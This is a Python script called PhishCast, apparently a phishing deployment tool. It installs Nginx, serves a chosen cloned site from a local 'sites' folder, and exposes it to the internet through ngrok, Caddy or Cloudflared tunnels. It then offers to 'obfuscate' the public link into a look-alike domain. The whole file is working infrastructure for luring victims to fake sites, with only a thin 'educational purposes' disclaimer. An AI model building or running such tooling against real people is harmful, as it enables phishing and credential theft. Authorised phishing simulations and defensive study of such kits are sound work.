######################################################################################################################################################################################################################
# Python script for phishing sites and link generation Note: Be mindful of the scope of work, & rules of engagement.
# sudo python3 PhishCast.py - ensure all file are located in the sam folder.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################


import os
import subprocess
import sys
import random
import string


# Banner
def display_splash_screen():
    splash = r"""
  
    
 __________.__    .__        .__    _________                  __          _____  ____         .__       _____           _______  ____ 
\______   \  |__ |__| ______|  |__ \_   ___ \_____    _______/  |_       /  |  |/_   |______  |  |__   /  |  |          \   _  \/_   |
 |     ___/  |  \|  |/  ___/|  |  \/    \  \/\__  \  /  ___/\   __\     /   |  |_|   |\____ \ |  |  \ /   |  |_  ______ /  /_\  \|   |
 |    |   |   Y  \  |\___ \ |   Y  \     \____/ __ \_\___ \  |  |      /    ^   /|   ||  |_> >|   Y  |    ^   / /_____/ \  \_/   \   |
 |____|   |___|  /__/____  >|___|  /\______  (____  /____  > |__|______\____   | |___||   __/ |___|  |____   |           \_____  /___|
               \/        \/      \/        \/     \/     \/     /_____/     |__|      |__|         \/     |__|                 \/     
                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
    }===={  }====={  }====={  }======{  }======{  }======={
   (______)(_______)(_______)(________)(________)(_________)
   
 
"""
    print(splash)


# Function to generate Nginx config for the selected site
def generate_nginx_config(site_name):
    site_folder = os.path.join("sites", site_name)
    if not os.path.exists(site_folder):
        print(f"Site folder for {site_name} does not exist.")
        return None

    nginx_config_path = f"/etc/nginx/sites-available/{site_name}"
    symlink_path = f"/etc/nginx/sites-enabled/{site_name}"

    # Nginx config template
    nginx_config = f"""
server {{
    listen 80;
    server_name localhost;

    root {site_folder};  # Path to the selected site folder

    index index.php index.html;
    location / {{
        try_files $uri $uri/ =404;
    }}

    location ~ \.php$ {{
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;  # Adjust to your PHP-FPM version
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }}

    location /assets/ {{
        try_files $uri =404;
    }}
}}
"""

    # Write the config to the file
    with open(nginx_config_path, 'w') as config_file:
        config_file.write(nginx_config)

    # Create a symlink to enable the site
    if not os.path.exists(symlink_path):
        os.symlink(nginx_config_path, symlink_path)

    return nginx_config_path

# Function to reload Nginx and serve the selected site
def serve_site_with_nginx(site_name):
    nginx_config_path = generate_nginx_config(site_name)
    if nginx_config_path:
        print(f"Generated Nginx config for {site_name}: {nginx_config_path}")

        # Reload Nginx to apply the new config
        try:
            subprocess.run(["sudo", "nginx", "-s", "reload"], check=True)
            print(f"Successfully started Nginx and serving {site_name}")
        except subprocess.CalledProcessError as e:
            print(f"Error restarting Nginx: {e}")

# Function to check if a command exists
def command_exists(command):
    return subprocess.call(f"type {command}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0

# Function to handle reverse proxy options (NGROK, Caddy, Cloudflared)
def reverse_proxy_setup():
    print("\nSelect a reverse proxy:")
    print("1. NGROK          2. Caddy          3. Cloudflared")
    choice = int(input("Enter the number of the reverse proxy to use: "))

    url = None
    if choice == 1:
        if not command_exists("ngrok"):
            print("Installing NGROK...")
            subprocess.run(["wget", "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"], check=True)
            subprocess.run(["unzip", "ngrok-stable-linux-amd64.zip"], check=True)
            subprocess.run(["sudo", "mv", "ngrok", "/usr/local/bin/ngrok"], check=True)
        print("Starting NGROK...")
        process = subprocess.Popen(["ngrok", "http", "80"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        url = extract_ngrok_url()
        if url:
            print(f"NGROK URL: {url}")
    elif choice == 2:
        if not command_exists("caddy"):
            print("Installing Caddy...")
            subprocess.run(["sudo", "apt-get", "install", "-y", "caddy"], check=True)
        print("Starting Caddy...")
        subprocess.run(["caddy", "run", "--config", "/etc/caddy/Caddyfile"], check=True)
        print("Caddy is running. Please check your Caddy configuration for the URL.")
    elif choice == 3:
        if not command_exists("cloudflared"):
            print("Installing Cloudflared...")
            subprocess.run(["wget", "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb"], check=True)
            subprocess.run(["sudo", "dpkg", "-i", "cloudflared-linux-amd64.deb"], check=True)
        print("Starting Cloudflared...")
        process = subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:80"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        url = extract_cloudflared_url()
        if url:
            print(f"Cloudflared URL: {url}")
    else:
        print("Invalid choice. Please try again.")
        reverse_proxy_setup()
        return

    if url:
        print("\nDo you want to obfuscate the URL? (yes/no)")
        obfuscate = input().strip().lower()
        if obfuscate == 'yes':
            obfuscated_url = obfuscate_url(url)
            print(f"Obfuscated URL: {obfuscated_url}")

def extract_ngrok_url():
    # Extract the URL from the ngrok output
    process = subprocess.Popen(["curl", "--silent", "http://localhost:4040/api/tunnels"], stdout=subprocess.PIPE)
    output, _ = process.communicate()
    if output:
        import json
        tunnels = json.loads(output)
        for tunnel in tunnels['tunnels']:
            if tunnel['proto'] == 'http':
                return tunnel['public_url']
    return None

def extract_cloudflared_url():
    # Extract the URL from the cloudflared output
    process = subprocess.Popen(["cloudflared", "tunnel", "info"], stdout=subprocess.PIPE)
    output, _ = process.communicate()
    if output:
        import json
        tunnels = json.loads(output)
        for tunnel in tunnels:
            return tunnel['url']
    return None

def obfuscate_url(url):
    # Generate an obfuscated URL similar to well-known domains
    site_name = url.split("//")[1].split('.')[0]  # Extract the site name from the URL
    random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
    obfuscated_url = f"http://www.{site_name}.com/{random_string}"
    return obfuscated_url

# Function to generate a random PIN
def generate_pin():
    return ''.join(random.choices(string.digits, k=6))

# Main function for site selection
def main():
    display_splash_screen()

    # Disclaimer
    print("\nDISCLAIMER: This script is for educational purposes only. Use it ethically and responsibly. Do you agree? (yes/no)")
    agreement = input().strip().lower()
    if agreement != 'yes':
        print("You did not agree to the disclaimer. Exiting.")
        sys.exit(1)

    # Generate and display PIN
    pin = generate_pin()
    print(f"Generated PIN: {pin}")

    # Automate the installation of Nginx
    print("Installing Nginx...")
    subprocess.run(["sudo", "apt-get", "update"], check=True)
    subprocess.run(["sudo", "apt-get", "install", "-y", "nginx"], check=True)
    print("Nginx installed successfully.")

    # Check if sites/ folder exists
    if not os.path.exists('sites'):
        print("The 'sites' folder is missing. Please ensure you have the required folder structure.")
        sys.exit(1)

    sites = os.listdir("sites")
    if not sites:
        print("No sites found in the 'sites' folder.")
        sys.exit(1)

    print("Choose a site to serve:")
    for i, site in enumerate(sites, start=1):
        print(f"{i}. {site}", end='    ')
        if (i % 3 == 0):
            print()

    choice = int(input("\nEnter the number of the site you want to serve: "))
    if 1 <= choice <= len(sites):
        selected_site = sites[choice - 1]
        print(f"Serving {selected_site}...")
        serve_site_with_nginx(selected_site)

        # Ask for reverse proxy setup
        reverse_proxy_setup()
    else:
        print("Invalid choice.")

if __name__ == "__main__":
    main()
